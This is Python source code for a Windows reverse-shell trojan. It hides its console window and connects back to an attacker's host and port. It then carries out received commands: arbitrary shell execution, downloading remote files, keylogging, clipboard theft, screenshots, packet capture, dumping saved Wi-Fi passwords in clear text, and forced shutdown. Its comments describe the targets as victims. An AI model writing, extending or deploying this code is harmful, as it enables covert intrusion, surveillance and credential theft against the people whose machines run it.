from socket import *
from getpass import getuser
import subprocess
import platform
import os
import win32console
import win32gui
import sys
import win32api,pythoncom
import time,random,string,base64
import datetime
import pyautogui
import keyboard
import urllib.request
import webbrowser
import pyperclip
import http.server
import socketserver
from pynput.keyboard import Key, Listener
import logging
# hiding the payload
def hide_window():
    win = win32console.GetConsoleWindow()
    win32gui.ShowWindow(win, 0)
# fetch victim information
def collect_os_info():
    get_os =  platform.uname()
    get_user = "[R01]"+getuser()
#    talk_back(get_user)
    os_info = '[OS INFO] client_name: '+str(get_user)+' <-> '+'client_os: '+str(get_os)
    return os_info
def generate_file_name():
    generation_time = datetime.datetime.now()
    filename = generation_time.strftime("Screenshot_%Y-%m-%d_%H-%M-%S")
    return filename
def set_clipboard(text):
    statement = "Setting clipboard to: "+text
    pyperclip.copy(text)
    return statement
def get_clipboard():
    statement= str(pyperclip.paste())
    return statement
def take_screenshot():
    # statement = 'Taking screenshot...'
    pyautogui.screenshot().save(generate_file_name() + '.png')
    statement = statement+'\nScreenshot saved!'
    return statement
def serve_http():
    HTTP_PORT = 80
    statement = "serving at port"+ str(HTTP_PORT)
    Handler = http.server.SimpleHTTPRequestHandler
    with socketserver.TCPServer(("", HTTP_PORT), Handler) as httpd:
        
        httpd.serve_forever()
    return statement
def analyze_lan_traffic(delay,filename):
   # statement = 'Starting Trace Capture...'
    subprocess.run(['netsh', 'trace', 'start', 'capture=yes', 'tracefile='+filename], capture_output=True)
    time.sleep(delay)
    statement = 'Stopping Trace...'
    subprocess.run(['netsh', 'trace', 'stop'], capture_output=True)
    return statement
def press_keys(keys):
    keyboard.write(keys)
    statement = 'Typing '+ keys
    return statement
def download_file(url):
    filename = url.split('/')[-1]
    urllib.request.urlretrieve(url, filename)
    if os.path.exists(filename):
        statement = f"{filename} downloaded successfully!"
    else:
        statement = f"Failed to download {filename}"
    return statement
def open_link(link):
    webbrowser.open(link)
    statement = 'Opening '+link +' ...'
    return statement
def generate_wlan_profile():
    result = subprocess.run(["netsh wlan show profile"], stdout=subprocess.PIPE)
    statement = result.stdout.decode('utf-8')
    return statement
def generate_wlan_ind_profile(profile_name):
    result = subprocess.run([f"netsh wlan show profile name={profile_name} key=clear"], stdout=subprocess.PIPE)
    statement = result.stdout.decode('utf-8') 
    return statement

def talk_back(message):
    print("Sending [ "+message+" ]...")
    connection.send(message.encode())
def record_key_strokes():
    log_dir = ""
    logging.basicConfig(filename=(log_dir + "keylogs.txt"), \
	level=logging.DEBUG, format='%(asctime)s: %(message)s')
    def on_press(key):
        logging.info(str(key))
    return "key logging started !"
    with Listener(on_press=on_press) as listener:
        listener.join()
    
hide_window()
# Lhost and lport
HOST = 
PORT = 444
# connection configuration
connection = socket(AF_INET, SOCK_STREAM)
connection.connect((HOST, PORT))
talk_back(collect_os_info())
print('connection established !')
# payload execution
while True:
    receiver = connection.recv(1024).decode()
    if receiver == 'exit':
        exit()
    elif receiver[:2] == 'cd':
        os.chdir(receiver[3:])
        talk_back(os.getcwd())
    elif ".exe" in receiver:
        # warning = "(!) Executing "+receiver
        # talk_back(warning)
        result = subprocess.run(receiver, shell=True, capture_output=True)
        # Print the output of the command
        # talk_back(result)
        statement = "done !"
        talk_back(statement)
    elif "type" in receiver:
        text = receiver[4:]
        time.sleep(2)
        statement = press_keys(text)
        talk_back(statement)
    elif "download" in receiver:
        URL = receiver[8:]
        statement = download_file(URL)
        talk_back(statement)
    elif "set clipboard" in receiver:
        text = receiver[14:]
        statement = str(set_clipboard(text))
        talk_back(statement)
    elif "get clipboard" in receiver:
        statement = get_clipboard()
        talk_back(statement)
    elif "analyze lan traffic" in receiver:
        statement = analyze_lan_traffic()
        talk_back(statement)
    elif "take screenshot" in receiver:
        statement = take_screenshot()
        talk_back(statement)
    elif "start file server" in receiver:
        statement = serve_http()
        talk_back(statement)
    elif "generate wlan profile *" in receiver:
        statement = generate_wlan_profile()
        talk_back(statement)
    elif receiver == "generate wlan profile":
        statement = generate_wlan_ind_profile(receiver[22:])
        talk_back(statement)
    elif 'browse' in receiver[:6]:
        statement = open_link(receiver[7:])
        talk_back(statement)
    elif 'shutdown' in receiver[:8]:
        if 'shutdown -t' in receiver[:11]:
            subprocess.getoutput('shutdown -s -t '+receiver[12:])
            statement = 'Shutting down in'+ str(int(receiver[12:])/60)+'minute(s)'
        else:
            subprocess.getoutput('shutdown -s -t 30')
            statement = 'Shutting down in 30 seconds'
        talk_back(statement)
    elif receiver == 'start keylogger':
        statement = record_key_strokes()
        talk_back(statement) 
    else:
        out_put = subprocess.getoutput(receiver)
        statement = "Executing command:" + receiver+'\n'+out_put
        if out_put =='' or out_put == None:
            output='NO OUTPUT'
            talk_back(statement)
            talk_back(out_put)
        else:
            talk_back(statement)
